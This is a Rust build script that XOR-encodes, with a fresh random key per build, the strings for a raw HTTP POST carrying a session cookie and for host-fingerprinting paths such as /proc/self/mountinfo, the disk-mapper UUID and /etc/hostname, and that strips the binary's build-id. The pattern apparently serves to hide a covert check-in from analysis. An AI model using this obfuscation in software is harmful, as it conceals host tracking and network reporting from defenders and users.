use std::env;
use std::fs;
use std::path::Path;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("encoded_strings.rs");

    // Generate a random 16-byte key per build
    let key: Vec<u8> = (0..16).map(|_| rand_byte()).collect();

let strings = vec![
    // HTTP strings
    ("POST_LINE", "POST / HTTP/1.1\r\n"),
    ("CONTENT_TYPE_HEADER", "Content-Type: application/x-www-form-urlencoded\r\n"),
    ("CONTENT_LENGTH", "Content-Length: "),
    ("COOKIE_PREFIX", "Cookie: sid="),
    ("CONNECTION_CLOSE", "Connection: close\r\n"),
    ("HOST_PREFIX", "Host: "),
    ("CRLF", "\r\n"),
    ("HTTP_SCHEME", "http://"),
    ("HTTPS_SCHEME", "https://"),
    ("NULL_BYTE_ERR", "null byte in path"),

    // Identity paths
    ("PROC_MOUNTINFO", "/proc/self/mountinfo"),
    ("PROC_MOUNTS", "/proc/mounts"),
    ("PROC_CPUINFO", "/proc/cpuinfo"),
    ("PROC_VERSION", "/proc/version"),
    ("SYS_DM_UUID", "/sys/block/dm-0/dm/uuid"),
    ("DEV_MAPPER", "/dev/mapper/"),
    ("ETC_HOSTNAME", "/etc/hostname"),
    ("MODEL_NAME", "model name"),
    ("UUID_PREFIX", "UUID="),
];

    let mut code = String::new();

    // Emit the key
    code.push_str(&format!(
        "pub const XOR_KEY: &[u8] = &{:?};\n\n",
        key
    ));

    // Emit each encoded string
    for (name, plaintext) in &strings {
        let encoded: Vec<u8> = plaintext
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect();

        code.push_str(&format!(
            "pub const {}: &[u8] = &{:?};\n",
            name, encoded
        ));
    }

    fs::write(&dest_path, code).unwrap();


    // Run a post-build strip
    println!("cargo:rustc-link-arg=-Wl,--build-id=none");

    // Tell cargo to rerun if build.rs changes
    println!("cargo:rerun-if-changed=build.rs");
}

fn rand_byte() -> u8 {
    // Simple entropy from system
    let mut buf = [0u8; 1];
    let _ = std::fs::File::open("/dev/urandom")
        .and_then(|mut f| {
            use std::io::Read;
            f.read_exact(&mut buf)
        });
    buf[0]
}